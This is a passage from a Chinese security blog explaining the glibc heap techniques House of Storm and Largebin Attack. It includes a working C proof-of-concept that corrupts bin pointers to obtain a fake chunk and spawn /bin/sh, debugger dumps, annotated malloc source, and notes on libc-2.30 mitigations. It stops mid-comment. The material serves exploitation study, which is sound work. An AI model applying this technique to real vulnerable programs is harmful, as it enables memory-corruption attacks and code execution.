<li>需要攻击者在 <code>largebin</code> 和 <code>unsortedbin</code> 中分别布置一个chunk，这两个chunk需要在归位之后处于同一个 <code>largebin</code> 的index中，且 <code>unsortedbin</code> 中的chunk要比 <code>largebin</code> 中的大</li>
<li>需要 <code>unsorted_bin</code> 中的 <code>bk指针</code> 可控</li>
<li>需要 <code>largebin</code> 中的 <code>bk指针和bk_nextsize</code> 指针可控 </li>
</ul>
<p>相较于 <code>Largebin attack</code> 来说，攻击需要的条件多出了一条 “unsorted bin中的bk指针可控” ，但是基本上程序如果 <code>Largebin attack</code> 条件满足，基本代表存在UAF漏洞，那么多控制一个bk指针应该也不是什么难事</p>
<p>House Of Storm 利用姿势：</p>
<ul>
<li>利用 large bin attack 分别错位写一个size和bk的地址，size错位写了0x56（由于pie的原因，chunk的地址总是为6字节，但是头部地址可能是0x55或者0x56，这里需要0x56才能成功，因为malloc后会进行检测）</li>
<li>以下检测需要满足的要求，只需满足一条即可：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br><span class="line"><span class="comment">/* 1. victim 为 0 */</span></span><br><span class="line"><span class="comment">/* 2. IS_MMAPPED 为 1 */</span></span><br><span class="line"><span class="comment">/* 3. NON_MAIN_ARENA 为 0 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>利用 unsorted bin attack 在FD的位置写一个main_arena + 88的地址，从而绕过了检测</li>
</ul>
<p>House Of Storm 从根本上也是写堆地址，但是攻击者可以利用巧妙的构造 <strong>把这个堆地址伪造成size字段</strong> ，基于这个size字段，就可以展开 unsortedbin attack 了</p>
<p>伪造案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  presize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  fd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  bk;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  fd_nextsize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  bk_nextsize;</span><br><span class="line">&#125;chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_chunk = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line">	</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="keyword">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./test</span><br><span class="line">[<span class="number">1</span>]    <span class="number">5082</span> segmentation fault  ./test</span><br><span class="line">➜  桌面 ./test</span><br><span class="line">[<span class="number">1</span>]    <span class="number">5088</span> segmentation fault  ./test</span><br><span class="line">➜  桌面 ./test</span><br><span class="line">$ whoami</span><br><span class="line">yhellow</span><br></pre></td></tr></table></figure>
<p>接下来进行单步调试：</p>
<ul>
<li>基本操作执行完毕后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555a000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a000</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x55555555a450</span> —▸ <span class="number">0x7ffff7dd1f68</span> (main_arena+<span class="number">1096</span>) ◂— <span class="number">0x55555555a450</span></span><br></pre></td></tr></table></figure>
<ul>
<li>看一下“unsorted_chunk”和“large_chunk”中的数据：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a000</span> <span class="comment">/* unsorted_chunk */</span></span><br><span class="line"><span class="number">0x55555555a000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x55555555a010</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span> <span class="comment">/* main_arena */</span></span><br><span class="line"><span class="number">0x55555555a020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a450</span> <span class="comment">/* large_chunk */</span></span><br><span class="line"><span class="number">0x55555555a450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x55555555a460</span>:	<span class="number">0x00007ffff7dd1f68</span>	<span class="number">0x00007ffff7dd1f68</span> <span class="comment">/* main_arena */</span></span><br><span class="line"><span class="number">0x55555555a470</span>:	<span class="number">0x000055555555a450</span>	<span class="number">0x000055555555a450</span> <span class="comment">/* large_chunk(指向自身) */</span></span><br><span class="line"><span class="number">0x55555555a480</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改完成后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a000</span> <span class="comment">/* unsorted_chunk */</span></span><br><span class="line"><span class="number">0x55555555a000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000421</span></span><br><span class="line"><span class="number">0x55555555a010</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x0000555555558040</span> <span class="comment">/* fake_chunk */</span></span><br><span class="line"><span class="number">0x55555555a020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55555555a450</span> <span class="comment">/* large_chunk */</span></span><br><span class="line"><span class="number">0x55555555a450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x55555555a460</span>:	<span class="number">0x00007ffff7dd1f68</span>	<span class="number">0x0000555555558048</span> <span class="comment">/* fake_chunk+8 */</span></span><br><span class="line"><span class="number">0x55555555a470</span>:	<span class="number">0x000055555555a450</span>	<span class="number">0x0000555555558023</span> <span class="comment">/* fake_chunk-0x18-5 */</span></span><br><span class="line"><span class="number">0x55555555a480</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all [corrupted] <span class="comment">/* GDB显示出错了 */</span></span><br><span class="line">FD: <span class="number">0x55555555a000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x55555555a000</span></span><br><span class="line">BK: <span class="number">0x55555555a000</span> —▸ <span class="number">0x555555558040</span> (chunk) ◂— <span class="number">0x0</span> <span class="comment">/* fake_chunk */</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x55555555a450</span> —▸ <span class="number">0x7ffff7dd1f68</span> (main_arena+<span class="number">1096</span>) ◂— <span class="number">0x55555555a450</span></span><br><span class="line">BK: <span class="number">0x55555555a450</span> —▸ <span class="number">0x555555558048</span> (chunk+<span class="number">8</span>) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现 fake_chunk 被链入 unsortedbin ，而且是第一个</li>
<li>正常申请是肯定会报错的，因为程序从 unsortedbin 中申请 fake_chunk 时通不过检查</li>
</ul>
<p>但是程序却可能不报错，为什么会这样呢？这一点需要在源码中查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* fwd =&gt; 最终为victim的上一个chunk(其实就是largebin chunk)*/</span></span><br><span class="line"><span class="comment">/* bck =&gt; 最终为victim的下一个chunk */</span></span><br><span class="line"><span class="comment">/* victim =&gt; 即将进入largebin的unsortedbin chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fwd-&gt;bk =&gt; fake_chunk+8 */</span></span><br><span class="line"><span class="comment">/* fwd-&gt;bk_nextsize =&gt; fake_chunk-0x18-5 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="comment">/* victim将成为新的纵向链表头 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">     <span class="comment">/* unsorted_bin-&gt;fd_nextsize=large_bin */</span></span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    <span class="comment">/* unsorted_bin-&gt;bk_nextsize=fake_chunk-0x18-5 */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    <span class="comment">/* (fake_chunk-0x18-5)=unsorted_bin */</span></span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    <span class="comment">/* (fake_chunk-0x18-5)+0x18=victim */</span></span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">	<span class="comment">/* bck=fake_chunk+8 */</span></span><br><span class="line">    <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    mark_bin (av, victim_index);</span><br><span class="line"></span><br><span class="line">    victim-&gt;bk=bck;</span><br><span class="line">    <span class="comment">/* unsorted_bin-&gt;bk=fake_chunk+8 */</span></span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    <span class="comment">/* unsorted_bin-&gt;fd=large_bin */</span></span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    <span class="comment">/* fake_chunk+8=victim */</span></span><br><span class="line">    bck-&gt;fd = victim;</span><br><span class="line">	<span class="comment">/* (fake_chunk+8)-8=victim */</span></span><br></pre></td></tr></table></figure>
<p>其实这就是 largebin attack 的作用了，最关键的一步是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"><span class="comment">/* (fake_chunk-0x18-5)+0x18=victim */</span></span><br></pre></td></tr></table></figure>
<p>其实就是在 fake_chunk-5 中写入了 victim</p>
<ul>
<li>如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，减去5个字节，剩下的就是0x55（或0x56）了</li>
<li>如果提前5个字节开始写堆地址，那么伪造在 <code>size字段</code> 上面的就正好是0x55</li>
</ul>
<p>也就是说，链入 unsortedbin 的 fake_chunk 的 <code>size字段</code> 是可能为0x56的，而0x56刚好可以通过 unsortedbin 的检查（注意：<code>size字段</code> 如果为“0x55”，那么P位就是“1”，通不过检查）</p>
<p>接下来程序就会申请到 fake_chunk ，然后在其中写入“/bin/sh”，作为system的参数</p>
<h2 id="版本对-House-Of-Storm-的影响"><a href="#版本对-House-Of-Storm-的影响" class="headerlink" title="版本对 House Of Storm 的影响"></a>版本对 House Of Storm 的影响</h2><p><strong>libc-2.30</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>有点类似于 unlink 的检查（检查目标chunk的上一个chunk的下一个chunk，是不是目标chunk）</p>
<p>由于 House Of Storm 会修改 fwd-&gt;bk_nextsize ，所以检查不通过，导致 House Of Storm 失效</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/27/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin%20Attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/27/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9ALargebin%20Attack/" class="post-title-link" itemprop="url">Ptmalloc算法：Largebin Attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-27 11:26:02" itemprop="dateCreated datePublished" datetime="2022-03-27T11:26:02+08:00">2022-03-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-28 12:30:37" itemprop="dateModified" datetime="2022-04-28T12:30:37+08:00">2022-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc算法：Largebin-Attack"><a href="#Ptmalloc算法：Largebin-Attack" class="headerlink" title="Ptmalloc算法：Largebin Attack"></a>Ptmalloc算法：Largebin Attack</h2><p>Large Bin Attack 是一种较为困难的攻击方式，他对攻击的条件要求较多，实现也较为复杂，通常和 Unsorted Bin 打配合来实现 house of storm，来达到提升影响力的作用</p>
<ul>
<li>libc-2.29 及以下版本，可以利用 Large Bin Attack 来写两个地址</li>
<li>libc-2.30 及以上版本中，只能利用 Large Bin Attack 来写一个地址</li>
</ul>
<h2 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h2><p>大于512（1024）字节的 chunk 称之为 large chunk，large bin 就是用于管理这些 large chunk 的</p>
<p>largebin 采用双链表结构，里面的 chunk 从头结点的 fd 指针开始，按大小顺序进行排列 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这个结构中的 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 来链接到下一个 size 的堆块头部和上一个 size 的堆块头部，然后在相同 size 的堆块内部再通过 <strong>fd</strong> 和 <strong>bk</strong> 来进行内部的管理</p>
<ul>
<li>用 <strong>fd_nextsize</strong> 和 <strong>bk_nextsize</strong> 链接的链表为横向链表，用 <strong>fd</strong> 和 <strong>bk</strong> 链接的链表为纵向链表</li>
</ul>
<p>在横向链表中，堆管理器维护一个循环的单调链表，由最大的 size（在这个 index 下的最大 size）作为表头，最小的 size 作为表尾，且首尾相连</p>
<p>largebin 基础知识：</p>
<ul>
<li>largebin 中一共包括 63 个 bin，index为64~126，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内</li>
<li>largebin 的结构和其他链表都不相同，更加复杂</li>
<li>largebin 里除了有 fd，bk 指针，另外还有 fd_nextsize 和 bk_nextsize 这两个指针</li>
<li>largebin 的插入顺序不再是LIFO或FIFO，而是一种全新的方式</li>
</ul>
<p>largebin 特性：</p>
<ul>
<li>按照大小从大到小排序，若大小相同,按照 free 时间排序</li>
<li>若干个大小相同的堆块，只有首堆块的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 会指向其他堆块,后面的堆块的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 均为 “0”</li>
<li>size 最大的chunk的 <code>bk_nextsize</code> 指向最小的 chunk，size 最小的 chunk 的 <code>fd_nextsize</code> 指向最大的 chunk</li>
</ul>
<p>下面的代码将解释 largebin 的插入顺序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) <span class="comment">/* smallbin(暂时不管) */</span></span><br><span class="line">&#123;</span><br><span class="line">  victim_index = smallbin_index(size);<span class="comment">//获取size对应的smallbin的index</span></span><br><span class="line">  bck = bin_at(av, victim_index);<span class="comment">//bck指向size对应的smallbin的链表头</span></span><br><span class="line">  <span class="comment">//fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span></span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">/* largebin(核心) */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    victim =&gt; 需要插入的目标chunk</span></span><br><span class="line"><span class="comment">    fwd =&gt; 最终为victim的上一个chunk(可以定位victim)</span></span><br><span class="line"><span class="comment">    bck =&gt; 最终为victim的下一个chunk(可以定位victim)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">  victim_index = largebin_index(size); <span class="comment">/* 获取size对应的largebin的index */</span></span><br><span class="line">  bck = bin_at(av, victim_index); </span><br><span class="line">  fwd = bck-&gt;fd; </span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    fwd =&gt; 最大的chunk(对应链表头中的第一个chunk)</span></span><br><span class="line"><span class="comment">    bck =&gt; 对应的largebin的链表头</span></span><br><span class="line"><span class="comment">    bck-&gt;fd =&gt; 对应largebin中最大的chunk(并且是第一个chunk)</span></span><br><span class="line"><span class="comment">    bck-&gt;bk =&gt; 对应largebin中最小的chunk(并且是最后一个chunk)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">//如果largebin非空，在largbin进行按顺序插入</span></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">      <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">      size |= PREV_INUSE;</span><br><span class="line">      assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">          <span class="comment">/* </span></span><br><span class="line"><span class="comment">          &quot;bck-&gt;bk&quot;指向对应largebin中最小的chunk</span></span><br><span class="line"><span class="comment">           如果&quot;size&quot;&lt;&quot;bck-&gt;bk-&gt;size&quot;，那么目标chunk将成为新的最小chunk</span></span><br><span class="line"><span class="comment">           因此需要把victim添加到此largebin的尾部</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          </span><br><span class="line">          fwd = bck; <span class="comment">/* fwd = 原链表头 */</span></span><br><span class="line">          bck = bck-&gt;bk; <span class="comment">/* bck = 原链表尾(最后一个chunk) */</span>    </span><br><span class="line">        </span><br><span class="line">          victim-&gt;fd_nextsize = fwd-&gt;fd; </span><br><span class="line">          <span class="comment">/* 在&quot;victim-&gt;fd_nextsize&quot;中装入&quot;最大chunk&quot; */</span></span><br><span class="line">          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">          <span class="comment">/* 在&quot;victim-&gt;bk_nextsize&quot;中装入&quot;原最小chunk&quot; */</span></span><br><span class="line">          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          <span class="comment">/* 先把 &quot;victim&quot; 装入 &quot;原最小chunk-&gt;fd_nextsize&quot; */</span></span><br><span class="line">          <span class="comment">/* 再把 &quot;victim&quot; 装入 